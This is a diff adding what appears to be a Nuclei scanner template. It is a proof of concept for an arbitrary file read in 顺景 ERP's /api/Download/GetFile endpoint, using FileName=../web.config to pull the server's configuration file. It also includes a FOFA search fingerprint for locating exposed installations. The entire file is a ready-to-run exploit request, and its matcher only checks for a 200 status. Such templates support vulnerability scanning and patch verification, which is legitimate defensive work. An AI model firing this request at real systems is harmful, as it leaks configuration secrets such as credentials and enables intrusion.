@@ -1,0 +1,29 @@
+id: poc-fpgvn66sg3aacp25
+info:
+  name: 顺景ERP GetFile任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fpgvn66sg3aacp25'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fpgvn66sg3aacp25
+    fofa: body="api/DBRecord/getDBRecords"
+http:
+- raw:
+  - 'GET /api/Download/GetFile?FileName=../web.config&Title=123 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+
+    Connection: close
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
